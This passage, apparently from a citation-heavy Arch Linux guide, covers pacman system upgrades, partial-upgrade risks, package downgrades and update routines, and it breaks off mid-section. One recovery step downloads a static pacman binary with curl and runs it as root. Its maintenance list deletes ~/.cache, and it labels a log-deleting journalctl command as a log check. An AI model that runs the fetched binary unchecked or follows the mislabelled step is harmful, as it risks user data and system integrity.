**Regular orphan cleanup:** Periodically run `pacman -Qdt` to identify unnecessary packages.[6][4]

**Verify optional dependencies:** Use `pacman -Qi` to check optional dependencies and install those relevant to your use case.[4]

**Document complex dependencies:** Export dependency trees for critical packages to understand system structure.[6]

Sources
[1] [Pacman] Is there a way to 'walk' the dependency tree? https://www.reddit.com/r/archlinux/comments/gk27hn/pacman_is_there_a_way_to_walk_the_dependency_tree/
[2] [SOLVED] pacman show dependency list / Newbie Corner ... https://bbs.archlinux.org/viewtopic.php?id=97550
[3] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[4] How to Check Package Dependencies on Arch Linux https://www.siberoloji.com/how-to-check-package-dependencies-on-arch-linux/
[5] pactree man https://linuxcommandlibrary.com/man/pactree
[6] How to Remove a Package and Its Dependencies ... https://linuxhint.com/remove_package_dependencies_pacman_arch_linux/
[7] Arch Linux package manager (pacman) cheatsheet http://ratfactor.com/cards/arch-pacman-cheatsheet
[8] Just a list of useful commands - Community contributions https://forum.endeavouros.com/t/just-a-list-of-useful-commands/54893

# System Updates

## Full System Upgrades

### Basic System Upgrade Command

The standard command to perform a full system upgrade in Arch Linux is:[1][2][3][4]

```
sudo pacman -Syu
```


This is the recommended and ideal way to update an Arch system.[1][3]

### Understanding the -Syu Flags

The command breaks down as follows:[4][3]

**-S (Sync):** Synchronize packages from repositories. Tells pacman to install or upgrade packages.[3][4]

**-y (Refresh):** Refresh the package database. Forces pacman to download the latest package database from configured repositories. Updates the local system cache with repository information.[4][3]

**-u (Upgrade):** Perform a full system upgrade. Pacman compares versions of installed packages with those in the repository and upgrades outdated ones. Actually upgrades the packages.[3][4]

### Upgrade Process Flow

When running `pacman -Syu`, the system follows this sequence:[3]

1. Synchronizes package databases from repositories
2. Downloads latest repository metadata
3. Compares installed package versions with repository versions
4. Identifies packages requiring upgrades
5. Resolves dependencies for all upgrades
6. Displays upgrade summary with package list and sizes
7. Prompts for confirmation
8. Downloads packages to cache directory
9. Verifies package signatures
10. Executes PreTransaction hooks
11. Upgrades packages in dependency order
12. Executes PostTransaction hooks
13. Updates package database
14. Logs transaction to `/var/log/pacman.log`

### Best Practices

#### Regular Updates

Arch Linux is a rolling release distribution requiring regular updates. The recommended practice is:[3]

- Update the system regularly (daily or weekly minimum)[3]
- Never leave the system without updates for extended periods[3]
- Always perform full system upgrades before installing new packages[4]

#### Read Before Upgrading

Before running system upgrades, check the Arch Linux website for important announcements:[3]

```
https://archlinux.org/news/
```


Critical updates sometimes require manual intervention or configuration changes announced on the news page.[3]

#### Avoid Partial Upgrades

**Critical warning:** Never perform partial upgrades:[2][4]

```
# DO NOT RUN THIS
pacman -Sy package_name
```


Running `-Sy` without `-u` synchronizes the package database but doesn't upgrade the system, which can lead to dependency issues. This creates a mismatch between installed packages and repository expectations, potentially breaking the system.[4]

**Always use:**
```
pacman -Syu package_name
```


This ensures the system is fully upgraded before installing new packages.[4]

### Advanced Upgrade Options

#### Force Database Refresh

To force re-download of package databases even if they appear up-to-date, use double `-y`:[8][3]

```
sudo pacman -Syyu
```


This is useful when:[3]
- Switching mirror servers
- Suspecting database corruption
- Mirrors are out of sync

The double `-yy` flag forces fresh downloads of all repository databases regardless of their current state.[3]

#### Download-Only Mode

Download packages without installing them using the `-w` flag:[5][3]

```
sudo pacman -Syuw
```


This separates the download and installation steps:[3]
- Downloads all upgrade packages to cache
- Does not perform installation
- Allows later offline installation

**Benefits:**
- Prepare for offline upgrades[3]
- Script and automate downloads[3]
- Separate bandwidth-intensive downloads from installation[5]

**Complete the upgrade later:**
```
sudo pacman -Su
```


This performs the upgrade using already-downloaded packages.[3]

#### Allow Downgrades

Enable package downgrades when repository versions are older than installed versions:[6]

```
sudo pacman -Syuu
```


The double `-uu` flag allows downgrades. This is useful when:[6]
- Switching from testing repositories to stable
- Reverting to older package versions
- Repository versions have been rolled back

### Interrupting Upgrades

#### Safe Interruption Points

Interrupting a system upgrade with `Ctrl+C` is safe at certain stages:[5]

**Safe to interrupt:**
- During database synchronization[5]
- While downloading packages[5]
- During package integrity checks[5]
- At the confirmation prompt before installation[5]

**Dangerous to interrupt:**
- During package installation[5]
- While packages are being extracted[5]
- During scriptlet execution[5]

Interrupting during installation increases risk of system breakage. If an upgrade is interrupted during installation, complete it immediately with `pacman -Syu`.[7]

#### Post-Interruption Recovery

If an upgrade is interrupted after the `-Sy` phase but before completion:[5]

1. The database has been synchronized
2. System is in a partial upgrade state
3. Must complete the upgrade before any other operations
4. Run `pacman -Syu` immediately to finish[5]

Never install new packages with `pacman -S` after an interrupted upgrade—complete the upgrade first.[5]

### Including AUR Packages

#### Official Repositories Only

Standard `pacman -Syu` updates only official repository packages (core, extra, multilib). It does not include AUR (Arch User Repository) packages.[1][4]

#### Updating AUR Packages

For systems with AUR packages, use an AUR helper like `yay` or `paru`:[8][1][4]

```
yay -Syu
```


Or:
```
paru -Syu
```

AUR helpers delegate to pacman for official packages and then update AUR packages. This provides a unified upgrade command for both official and AUR packages.[1][7]

**Separate approach:**
```
sudo pacman -Syu    # Update official repos
yay -Sua            # Update AUR only
```


### Post-Upgrade Maintenance

#### Remove Orphaned Packages

After upgrades, orphaned packages may accumulate. List them with:[3]

```
pacman -Qdt
```


Remove orphaned packages:
```
sudo pacman -Rns $(pacman -Qdtq)
```


**Warning:** Review the list before removing to avoid unintentionally deleting wanted packages.[3]

#### Clean Package Cache

Over time, the package cache grows significantly. Clean old versions:[3]

```
sudo pacman -Sc     # Remove uninstalled packages
sudo pacman -Scc    # Remove all cached packages
```


For more granular control, use `paccache` from `pacman-contrib`:
```
paccache -r         # Keep 3 most recent versions
paccache -rk1       # Keep only 1 version
```

### Handling Upgrade Issues

#### Dependency Conflicts

If the upgrade fails with dependency errors:[8]

1. Read the error message carefully
2. Check Arch Linux news for known issues
3. Identify conflicting packages
4. Remove or update conflicting packages manually
5. Retry the upgrade

**Example scenario:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: package-query: requires pacman<4.3
```


**Resolution:**
Update or remove the conflicting package:
```
sudo pacman -Rns package-query
sudo pacman -Syu
```


#### Full Database Refresh

When experiencing persistent issues, force full database refresh:[3]

```
sudo pacman -Syyu
```


This ensures repository databases are completely current.[3]

#### Check Mirror Status

If downloads are slow or failing, update mirror list:

```
sudo pacman-mirrors --fasttrack    # Manjaro
sudo reflector --latest 10 --sort rate --save /etc/pacman.d/mirrorlist  # Arch
```

Then retry the upgrade.

### Upgrade Verification

After completing an upgrade, verify system health:

```
pacman -Qk          # Check all package files
pacman -Qkk         # Thorough file verification
journalctl -xb      # Check system logs for errors
```

### Automation Considerations

When automating system upgrades, use `--noconfirm` cautiously:

```
sudo pacman -Syu --noconfirm
```

This skips confirmation prompts but may cause issues if manual intervention is required. Monitor automated upgrades carefully.

### Reboot Requirements

Some upgrades require system reboots, particularly:
- Kernel updates
- systemd updates
- Critical system library updates

Check if a reboot is needed after major upgrades and reboot when convenient.

Sources
[1] Is "sudo pacman -Syu" the ideal way to update an Arch ... https://www.reddit.com/r/archlinux/comments/9k7znt/is_sudo_pacman_syu_the_ideal_way_to_update_an/
[2] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[3] How to Update the System (`pacman -Syu`) on Arch Linux https://www.siberoloji.com/how-to-update-the-system-pacman--syu-on-arch-linux/
[4] Update your system. - Linux Docs - Fernando Cejas https://linux.fernandocejas.com/docs/how-to/update-your-system
[5] yes] Possible to safely stop upgrade? / Pacman & Package ... https://bbs.archlinux.org/viewtopic.php?id=169223
[6] Pacman equivalent to pamac upgrade --force-refresh https://forum.manjaro.org/t/pacman-equivalent-to-pamac-upgrade-force-refresh/152786
[7] Updating System in Terminal - Pacman & AUR helpers https://forum.endeavouros.com/t/updating-system-in-terminal/8107
[8] Cannot upgrade Arch Linux (pacman -Syu not working) https://stackoverflow.com/questions/35251359/cannot-upgrade-arch-linux-pacman-syu-not-working
[9] Full system update with pamac - Support https://forum.manjaro.org/t/full-system-update-with-pamac/173584
[10] Full system update is giving error on pacman upgrade https://forum.garudalinux.org/t/full-system-update-is-giving-error-on-pacman-upgrade/39236

## Partial Upgrades (Risks and Considerations)

### Definition of Partial Upgrades

A partial upgrade occurs when the package database is synchronized but the full system upgrade is not completed, leading to mismatched package versions. This happens when running `pacman -Sy` followed by `pacman -S package_name` instead of `pacman -Syu`.[1][2][3]

### Why Partial Upgrades Are Unsupported

Arch Linux is a rolling release distribution where new library versions are continuously pushed to repositories. When libraries are updated, developers and package maintainers rebuild all dependent packages against the new library versions.[2][3]

**Critical issue:** Arch does not use versioned dependencies. This means packages don't specify exact library versions they require—they expect the current repository version.[1]

### The Fundamental Problem

#### Dependency Version Mismatches

When only some packages are upgraded, dependency version mismatches occur:[4][3][2][1]

**Example scenario:**
1. Two packages depend on the same library (e.g., `libcurl`)
2. A library update changes the shared object version (soname bump)
3. Package A is rebuilt against the new library version
4. You run `pacman -Sy` (sync database) but not `-Syu` (full upgrade)
5. Later, you run `pacman -S packageA` which installs the new version
6. This also upgrades `libcurl` as a dependency
7. Package B still expects the old `libcurl` version
8. Package B is now broken because it can't find the old library version[2][1]

#### ABI Breakage

Shared library updates often include ABI (Application Binary Interface) changes:[1][2]

**Real-world example:**
```
curl package gets updated with a soname version bump
pacman package is rebuilt against new curl
You update only curl → pacman breaks (can't find new curl)
You update only pacman → pacman breaks (can't find old curl)
```


The critical problem: **If pacman itself breaks, you cannot use pacman to fix the system**.[1]

### Dangerous Commands to Avoid

#### pacman -Sy package

**Never run:**
```
pacman -Sy package_name
```


This synchronizes the database and then installs a package without upgrading the system. This is the most common cause of partial upgrades.[3][2]

#### pacman -Sy Followed by pacman -S

**Never run:**
```
pacman -Sy
pacman -S package_name
```


This creates the same partial upgrade scenario. Even if you don't intend to install anything immediately after `-Sy`, you might forget later and accidentally create a partial upgrade.[3][2][1]

#### Interrupted pacman -Syu

**Dangerous scenario:**
```
pacman -Syu
[Packages listed for upgrade]
:: Proceed with installation? [Y/n] n
```


Saying "No" to the upgrade after `-Sy` has already run leaves the database synced but packages not upgraded. This is equivalent to running `pacman -Sy` alone.[4]

**If interrupted:** You must complete the upgrade before any other operations. The error must be resolved and the upgrade completed as soon as possible.[2][3]

#### pacman -Syuw

**Risky command:**
```
pacman -Syuw
```


This downloads packages but doesn't install them, while still synchronizing the database. It carries the same partial upgrade risks as `pacman -Sy`.[3][5]

### Real-World Consequences

#### System-Level Breakage

**Best case scenario:** A minor application stops working until you complete the full upgrade.[4]

**Worst case scenario:** Critical system packages like `systemd`, `glibc`, or `pacman` itself break. This can result in:[4]
- Inability to boot the system[4]
- Broken package manager preventing recovery[1]
- Complete system reinstallation required[4]

#### Example Breakage Scenario

**Detailed walkthrough:**[4]

1. You install your system (all packages at version X)
2. Time passes, Arch repositories update packages
3. You try to install a new package with `pacman -S coolpackage`
4. Installation fails because your database is outdated
5. You run `pacman -Sy` to refresh the database
6. You run `pacman -S coolpackage` successfully
7. The new package requires `libfoo.so.2`
8. Pacman upgrades `libfoo` from version 1 to version 2 as a dependency
9. An existing package `oldprogram` still depends on `libfoo.so.1`
10. `oldprogram` is now broken and cannot run[4]

### Safe Alternatives

#### checkupdates Utility

Use `checkupdates` from `pacman-contrib` to safely check for available upgrades without syncing the database:[2][1]

```
checkupdates
```


This downloads databases to a separate location, avoiding the partial upgrade risk. Even though it sees new updates, pacman still uses the old database.[2][1]

**Download packages without installing:**
```
checkupdates -d
```


This downloads pending updates to the cache without synchronizing the main database. Later, you can run `pacman -Syu` quickly using cached packages.[2][1]

#### Always Use pacman -Syu

**Correct approach:**
```
pacman -Syu
```


This synchronizes the database and performs a full system upgrade in one atomic operation.[3][2]

**When installing new packages:**
```
pacman -Syu package_name
```


This ensures the system is fully upgraded before installing the new package.[3][2]

### Additional Considerations

#### IgnorePkg and IgnoreGroup

Using `IgnorePkg` or `IgnoreGroup` in `/etc/pacman.conf` creates intentional partial upgrades:[5][2]

```
IgnorePkg = package_name
```


**Warning:** Be very careful with these directives. They can cause the same issues as partial upgrades when ignored packages have dependency relationships with upgrading packages.[2]

If you must ignore packages, monitor their dependencies closely.[2]

#### Local AUR Packages

Systems with locally built packages (AUR packages) require rebuilding when their dependencies receive soname bumps. AUR helpers like `yay` or `paru` handle this automatically, but manual builds must be monitored.[2]

#### Library Soname Bumps

When libraries receive soname bumps, they are **not backwards compatible**. Never "fix" broken binaries by creating symlinks to old library versions:[2]

**Don't do this:**
```
ln -s libfoo.so.2 libfoo.so.1  # WRONG
```


The proper fix is always a complete system upgrade:[2]
```
pacman -Syu
```

### Recovery from Partial Upgrades

#### If Partial Upgrade Occurs

If you've accidentally created a partial upgrade scenario:[2]

1. **Do not install any packages**
2. Complete the full system upgrade immediately:
   ```
   pacman -Syu
   ```
3. Ensure the upgrade completes successfully
4. Only after successful upgrade, proceed with other operations

#### If Pacman Itself Breaks

If pacman is broken due to a partial upgrade:[1]

**Use pacman-static:**
```
curl -L -o pacman-static https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -Syu
```

This static version bypasses library dependencies and can repair the system.[5]

### Why Other Distros Don't Have This Issue

#### Versioned Dependencies

Most distributions (like Debian/Ubuntu) use versioned dependencies:[4]
- Packages specify exact library versions required
- Multiple library versions coexist on the system
- Old and new versions available simultaneously
- Partial upgrades less likely to break dependencies[4]

#### Arch Design Philosophy

Arch Linux deliberately avoids keeping old libraries around:[4]
- Only current versions in repositories
- Cleaner system with less bloat
- Rolling release model requires all packages stay synchronized
- Trade-off: partial upgrades cause breakage[4]

### Best Practices Summary

**Always:**
- Run `pacman -Syu` for all system updates
- Complete interrupted upgrades immediately
- Use `checkupdates` to safely check for updates
- Read Arch Linux news before upgrading

**Never:**
- Run `pacman -Sy` alone
- Run `pacman -Sy package_name`
- Decline upgrades after syncing database
- Create symlinks to "fix" library issues

**Remember:** "The situation is all old or all new, no accidental partial upgrade".[1]

Sources
[1] Confused about arch linux partial upgrades : r/archlinux https://www.reddit.com/r/archlinux/comments/m5nw0k/confused_about_arch_linux_partial_upgrades/
[2] System maintenance - ArchWiki https://wiki.archlinux.org/title/System_maintenance
[3] How does pulseaudio work when `pulseaudio` isn't installed? https://forum.garudalinux.org/t/how-does-pulseaudio-work-when-pulseaudio-isnt-installed/14351/3
[4] Sy bad? (Beyond it being a "partial upgrade") / Newbie ... https://bbs.archlinux.org/viewtopic.php?id=241092
[5] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[6] Block updates if you have unread Arch Linux news https://forum.endeavouros.com/t/block-updates-if-you-have-unread-arch-linux-news/17003
[7] > Pacman doesn't support 'partial upgrades'[2] (once you ... https://news.ycombinator.com/item?id=29131080
[8] Arch Linux upgrade problems - It's FOSS Community https://itsfoss.community/t/arch-linux-upgrade-problems/11710

## Downgrading Packages

### When to Downgrade

Before downgrading packages, consider the reason. If it's due to a bug, search the Arch Linux Bugtracker for existing issues and report new ones if necessary. It's better to correct bugs or warn other users of issues rather than silently downgrade.[1]

### Important Warnings

**Dependency considerations:** Downgrading one package may require that its dependencies be downgraded as well. When the number of packages to downgrade is large, consider using a snapshot from the Arch Linux Archive to restore all packages to a specific date.[1]

**Configuration files:** Be careful with changes to configuration files and scripts. Pacman will handle this as long as you don't bypass its safeguards.[1]

**Soname changes:** If a downgrade involves a soname change, all dependencies may need downgrading or rebuilding too.[1]

**Process reload:** Similar to upgrading, downgrades are not picked up by already running processes. If the motivation for downgrading is avoiding a bug, be sure to restart affected programs.[1]

**Unsupported on rolling release:** On rolling-release distributions like Arch, only the very latest version of every package is officially supported. Older packages may break and are a temporary solution at best.[2]

### Method 1: Using the Pacman Cache

#### Basic Cache Downgrade

If a package was installed at an earlier stage and the pacman cache was not cleaned, install an earlier version from `/var/cache/pacman/pkg/`:[2][1]

```
sudo pacman -U /var/cache/pacman/pkg/package-old_version.pkg.tar.zst
```


**Example:**
```
sudo pacman -U /var/cache/pacman/pkg/firefox-81.0.1-1-x86_64.pkg.tar.zst
```


This process removes the current package and installs the older version. Dependency changes will be handled, but pacman will not handle version conflicts. If a library or other package needs to be downgraded with the packages, you must downgrade those packages yourself as well.[1]

#### Finding Available Versions in Cache

List available versions in your cache:

```
ls /var/cache/pacman/pkg/ | grep package_name
```

This shows all cached versions of the specified package.

#### Prevent Auto-Upgrade

Once the package is reverted and confirmed to work, temporarily ignore updates by adding the package to the `IgnorePkg` section of `pacman.conf` until the issue with the updated package is resolved:[1]

```
# /etc/pacman.conf
[options]
IgnorePkg = package_name
```


This prevents `pacman -Syu` from upgrading the package until you remove it from `IgnorePkg`.[1]

### Method 2: Using Arch Linux Archive

#### About the Archive

The Arch Linux Archive is a daily snapshot of the official repositories. It can be used to install a previous package version or restore the system to an earlier date.[2][1]

**Archive location:**
```
https://archive.archlinux.org/
```


#### Direct Package Installation

Find and download the desired package version from the archive:

```
sudo pacman -U https://archive.archlinux.org/packages/p/package_name/package_name-version.pkg.tar.zst
```


**Example:**
```
sudo pacman -U https://archive.archlinux.org/packages/f/firefox/firefox-83.0-1-x86_64.pkg.tar.zst
```


#### Browsing the Archive

Navigate the archive by package name:
- Browse by first letter: `https://archive.archlinux.org/packages/f/`
- View specific package: `https://archive.archlinux.org/packages/f/firefox/`
- All versions listed with direct download links[2]

#### System-Wide Date Restoration

To restore all packages to a specific date, modify `/etc/pacman.d/mirrorlist` to point to a snapshot date:[3][1]

```
# /etc/pacman.d/mirrorlist
Server=https://archive.archlinux.org/repos/YYYY/MM/DD/$repo/os/$arch
```


Then run:
```
sudo pacman -Syuu
```


The `-uu` flag allows downgrades. This restores all packages to versions available on the specified date.[3][1]

### Method 3: Using the downgrade Utility

#### Installation

The `downgrade` utility simplifies the downgrade process by checking both local cache and remote servers for old package versions.[4][5][6]

**Install from AUR using Paru:**
```
paru -S downgrade
```


**Install from AUR using Yay:**
```
yay -S downgrade
```


#### Basic Usage

The typical usage syntax is:[6]

```
sudo downgrade [PACKAGE, ...] [-- [PACMAN OPTIONS]]
```


**Downgrade a single package:**
```
sudo downgrade package_name
```


This command lists all available versions of the package (both new and old) from your local cache and remote mirrors. You can then interactively select which version to install.[6]

**Example:**
```
sudo downgrade opera
```


#### Interactive Selection

When you run `downgrade`, it presents a numbered list of available versions:

```
Available packages:
   1) opera-75.0.3969.171-1 (local)
   2) opera-74.0.3911.232-1 (remote)
   3) opera-73.0.3856.344-1 (remote)
   4) opera-72.0.3815.400-1 (remote)
```

Select the number corresponding to the desired version and press Enter.[6]

#### Add to IgnorePkg

After selecting and installing a version, `downgrade` prompts whether to add the package to `IgnorePkg` in `/etc/pacman.conf`. Confirming this prevents future automatic upgrades of the package.[6]

### Method 4: Downgrading the Kernel

#### Kernel Downgrade Procedure

In case of issues with a new kernel, Linux packages can be downgraded using the pacman cache. Go into `/var/cache/pacman/pkg/` and downgrade at least `linux`, `linux-headers`, and any kernel modules:[1]

```
sudo pacman -U linux-6.16.1.arch1-1-x86_64.pkg.tar.zst linux-headers-6.16-1-x86_64.pkg.tar.zst virtualbox-host-modules-arch-7.2.0-2-x86_64.pkg.tar.zst
```


Use the actual file paths from your cache directory.[1]

#### Kernel Downgrade from Live USB

If you are unable to boot after a kernel update, downgrade the kernel by chrooting into the system:[1]

1. Boot using Arch Linux USB flash installation media
2. Mount the system partition: `mount /dev/sdXN /mnt`
3. Mount `/boot` if on separate partition: `mount /dev/sdXN /mnt/boot`
4. Mount `/var` if on separate partition: `mount /dev/sdXN /mnt/var`
5. Chroot into the system: `arch-chroot /mnt`
6. Navigate to pacman cache and downgrade: `pacman -U /var/cache/pacman/pkg/linux-*.pkg.tar.zst`
7. Exit chroot: `exit`
8. Reboot[1]

### Method 5: Rebuilding the Package

#### From Official Repositories

If the package is unavailable in cache or archive, rebuild it from source:[1]

1. Retrieve the PKGBUILD with ABS
2. Change the software version in the PKGBUILD
3. Build with `makepkg`

Alternatively, find the package on the Packages website, click "View Changes", and navigate to the desired version. Download the necessary files and rebuild the package.[1]

#### From AUR

Old AUR packages can be built by checking out an old commit in the AUR package Git repository:[1]

```
git clone https://aur.archlinux.org/package_name.git
cd package_name
git log  # Find commit hash for desired version
git checkout commit_hash
makepkg -si
```


### Best Practices

**Test the downgrade:** After downgrading, test the package thoroughly to ensure it resolves the issue.[6]

**Monitor for updates:** Keep track of upstream bug reports to know when the issue is fixed.[1]

**Temporary solution:** Treat downgrades as temporary. Update to the latest version once the issue is resolved.[2][6]

**Document the issue:** Note why you downgraded and what symptoms prompted it for future reference.[1]

**Avoid partial downgrades:** When downgrading libraries, ensure all dependent packages are compatible.[1]

**Keep cache intact:** Don't clean the pacman cache if you anticipate needing to downgrade.[1]

Sources
[1] Downgrading packages - ArchWiki https://wiki.archlinux.org/title/Downgrading_packages
[2] How to downgrade a specfic package using Pacman - Stack Overflow https://stackoverflow.com/questions/69195690/how-to-downgrade-a-specfic-package-using-pacman
[3] is there an easy way to downgrade? (Arch-Linux specifically) - Reddit https://www.reddit.com/r/kde/comments/1bd165w/plasma_6_busted_up_my_whole_everything_is_there/
[4] AUR (en) - downgrade - Arch Linux https://aur.archlinux.org/packages/downgrade
[5] Downgrade packages in Arch Linux - GitHub https://github.com/archlinux-downgrade/downgrade
[6] How To Downgrade A Package In Arch Linux - OSTechNix https://ostechnix.com/downgrade-package-arch-linux/
[7] How to downgrade packages in Arch Linux. - YouTube https://www.youtube.com/watch?v=npFRcuuvNsA
[8] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman

## Update Strategies

### Read Before Upgrading

Before upgrading, users are expected to visit the Arch Linux home page to check the latest news:[1][2][3]

```
https://archlinux.org/
```


When updates require out-of-the-ordinary user intervention (more than what can be handled simply by following the instructions given by pacman), an appropriate news post will be made. Users should also subscribe to the RSS feed or the arch-announce mailing list.[2]

**Alternative news sources:**
```
https://archlinux.org/news/
RSS: https://archlinux.org/feeds/news/
```


Before upgrading fundamental software (such as the kernel, xorg, systemd, or glibc) to a new version, look over the appropriate forum to see if there have been any reported problems.[2]

### Automated News Checking

Use a pacman hook to prevent updating if there is fresh Arch News that you have not read since the last update ran:[1][2]

**Available tools:**
- `informant` (AUR)[2]
- `newscheck` (AUR)[2]
- `arch-manwarn` (AUR)[2]

**AUR helpers with built-in news checking:**
```
yay -Syu    # Automatically checks for news
paru -Syu   # Automatically checks for news
```


These helpers have options to automatically check for news if there's something like manual intervention involved.[1]

### Update Frequency Recommendations

#### Regular Update Schedule

**Daily updates:** Ideal for users who actively use their system. Most users update once a day or every few days. Updates are typically straightforward, and the risk associated with updates is minimal.[4]

**Weekly updates:** Acceptable for most use cases. Provides a good balance between staying current and avoiding constant maintenance.[4][1]

**Monthly updates:** Minimum recommended frequency. Waiting longer than a month between updates can complicate the process and lead to dependency issues.[4]

**What to avoid:** Never leave the system without updates for extended periods (months or years). An Arch installation that hasn't been updated in two years is technically feasible to update, but a complete reinstallation would be faster.[4]

#### Rolling Release Considerations

Arch is a rolling release distribution that receives continuous updates. It is recommended to perform full system upgrades regularly to enjoy both the latest bug fixes and security updates, and also to avoid having to deal with too many package upgrades that require manual intervention at once.[3][4][2]

When requesting support from the community, it will usually be assumed that the system is up to date.[2]

### Pre-Update Preparation

#### Have Rescue Media Ready

Make sure to have the Arch install media or another Linux "live" CD/USB available so you can easily rescue your system if there is a problem after updating:[1][2]

```
# Keep an Arch ISO on a ventoy USB
# Update the ISO periodically
```


#### Production Environment Testing

If you are running Arch in a production environment, or cannot afford downtime for any reason, test changes to configuration files, as well as updates to software packages, on a non-critical duplicate system first. Then, if no problems arise, roll out the changes to the production system.[2]

#### Timing Considerations

It is discouraged to upgrade a stable system shortly before it is required for carrying out an important task. Instead, wait to upgrade until there is enough time available to resolve any post-upgrade issues.[2]

Upgrading packages can raise unexpected problems that could need immediate intervention.[2]

### Update Execution

#### Standard Update Command

The primary command for system updates:[3][2]

```
sudo pacman -Syu
```


**For systems with AUR packages:**
```
yay -Syu
```


Or:
```
paru -Syu
```

AUR helpers update both official repositories and AUR packages in one command.[3]

#### Monitor the Update Process

Pay attention to the alert notices provided by pacman during upgrades. If any additional actions are required by the user, be sure to take care of them right away.[2]

If a pacman alert is confusing:
- Search the forums for clarification[2]
- Check the latest news on the Arch Linux homepage[2]
- Look for more detailed instructions[2]

### Post-Update Actions

#### Handle Configuration Files Promptly

When pacman is invoked, `.pacnew` and `.pacsave` files can be created. Pacman provides notice when this happens and users must deal with these files promptly.[2]

**Using checkservices script:**
The `archlinux-contrib` package provides a script called `checkservices` which runs `pacdiff` to merge `.pacnew` files then checks for processes running with outdated libraries and prompts the user if they want them to be restarted.[2]

Also, think about other configuration files you may have copied or created. If a package had an example configuration that you copied to your home directory, check to see if a new one has been created.[2]

#### Restart or Reboot After Upgrades

Upgrades are typically not applied to existing processes. You must restart processes to fully apply the upgrade.[2]

The kernel is particularly difficult to patch without a reboot. A reboot is always the most secure option, but if this is very inconvenient, kernel live patching can be used to apply upgrades without a reboot.[2]

**When to reboot:**
- Kernel updates[4]
- systemd updates
- Critical system library updates
- After major upgrades

**Note:** If an update involves the kernel or its modules, it's wise to hold off if you don't plan to reboot right away, as the old modules will be removed.[4]

### AUR Package Management

If the system has packages from the AUR, carefully upgrade all of them. Make sure to update your AUR packages as well, especially when system libraries change, as this is a common source of user errors.[4][2]

Occasionally, new software might introduce bugs or compatibility issues with your hardware.[4]

### Selective Update Strategies

#### Using IgnorePkg

If you encounter trouble with a new kernel version, it's generally acceptable to use `IgnorePkg` for the linux package to prevent the update:[4]

```
# /etc/pacman.conf
[options]
IgnorePkg = linux
```


**Warning:** While you can defer updates for many packages, be cautious, as this can lead to a partial upgrade, which is unsupported. Some critical system packages cannot be individually held back.[4]

#### Holding Back Updates Temporarily

When updates are available but you're not ready to apply them:

1. Check the news for manual intervention requirements
2. If manual intervention is needed and you can't perform it immediately, delay the update
3. Never run `pacman -Sy` alone—always complete the full upgrade when you start
4. Document which packages you're holding back and why

### Community Research Strategy

Check forums and Reddit for potential issues before updating:[1]

```
# Search on Reddit: r/archlinux
# Look for posts about recent updates
# Check for widespread issues or bugs
```


This proactive approach helps identify problems before they affect your system.[1]

### Backup and Recovery Tools

#### downgrade Utility

Keep the `downgrade` tool available as a stopgap to roll back bad packages at times:[1]

```
paru -S downgrade
yay -S downgrade
```


This tool provides quick recovery when a package update causes problems.[1]

#### Pacman Cache

The previous packages are stored in the `/var/cache` directory, allowing you to revert to earlier versions if any issues arise.[4]

Use `paccache` to help manage your cached packages effectively:[4]

```
paccache -r      # Keep 3 most recent versions
paccache -rk1    # Keep only 1 version
```


### Maintenance Integration

#### Regular Maintenance Tasks

Combine updates with regular maintenance:[3]

```
# 1. Update system
sudo pacman -Syu

# 2. Clean package cache
paccache -r

# 3. Remove orphaned packages
sudo pacman -Rns $(pacman -Qdtq)

# 4. Clean home directory cache
rm -rf ~/.cache/*

# 5. Check system logs
journalctl --vacuum-size=100M
```


#### Troubleshooting Common Issues

**Marginal trust errors:**
If you encounter "signature from someone is marginal trust" errors:[3]

```
sudo pacman -Sy archlinux-keyring
sudo pacman -Syu
```


This updates the keyrings and then runs the full system upgrade command again.[3]

### Best Practices Summary

**Always:**
- Read Arch Linux news before updating[3][1][2]
- Have rescue media available[1][2]
- Use `pacman -Syu` for full system upgrades[2]
- Handle `.pacnew` files promptly[2]
- Restart or reboot after significant updates[2]
- Update AUR packages when system libraries change[4][2]

**Never:**
- Perform partial upgrades (`pacman -Sy package_name`)[2]
- Update immediately before critical tasks[2]
- Ignore pacman alerts during upgrades[2]
- Leave the system without updates for months[4]

**Recommended frequency:**
- Daily to weekly for active systems[1][4]
- Minimum monthly for occasional-use systems[4]

Sources
[1] what are the best practices to update arch? : r/archlinux https://www.reddit.com/r/archlinux/comments/19d6h04/what_are_the_best_practices_to_update_arch/
[2] System maintenance - ArchWiki https://wiki.archlinux.org/title/System_maintenance
[3] Arch Linux System Maintainance. https://fernandocejas.com/blog/engineering/2022-03-30-arch-linux-system-maintance/
[4] How often should I be updating my Arch installation? https://www.reddit.com/r/archlinux/comments/1l39jb4/how_often_should_i_be_updating_my_arch/
[5] Best practices for updating Arch Linux systems safely https://www.facebook.com/groups/linux.fans.group/posts/25519821174299657/
[6] Essential Tips for Updating & Upgrading Your Linux Distro https://linuxsecurity.com/howtos/learn-tips-and-tricks/upgrade-your-linux-distro
[7] General recommendations - ArchWiki https://wiki.archlinux.org/title/General_recommendations
[8] Arch Linux Maintenance | Pacman maintenance https://www.youtube.com/watch?v=3BnHHP7Fmo0


# Database Management

## Synchronizing Package Databases

### Purpose of Database Synchronization

Package databases contain metadata about available packages in repositories, including versions, dependencies, descriptions, and download locations. Synchronizing these databases ensures your local system knows about the latest available packages and versions.[1][2][3]

### Basic Synchronization Command

#### Refresh Package Databases

To download fresh package databases from configured mirror servers, use the `-y` or `--refresh` flag:[2][3]

```
sudo pacman -Sy
```


This downloads a fresh copy of the master package databases (`repo.db`) from servers defined in `/etc/pacman.conf`. The `-y` flag refreshes the database for each repository configured on your system.[2][3]

**Warning:** Never use `pacman -Sy` alone without following it with `-u` (upgrade) unless you understand the risks of partial upgrades. Always prefer `pacman -Syu` for system updates.[4][1]

### When to Synchronize

#### Regular System Updates

Database synchronization is typically combined with system upgrades:[3][2]

```
sudo pacman -Syu
```


This should be used each time you perform system upgrades (`-u`). The combination synchronizes databases and then upgrades all out-of-date packages.[3][2]

#### Before Package Installation

When installing packages, synchronize first to ensure you get the latest versions:

```
sudo pacman -Syu package_name
```

This performs a full system upgrade before installing the new package, avoiding partial upgrade issues.[4]

### Force Database Refresh

#### Double Refresh Flag

To force re-download of package databases even if they appear up-to-date, pass the `--refresh` flag twice:[5][3]

```
sudo pacman -Syy
```


Or:
```
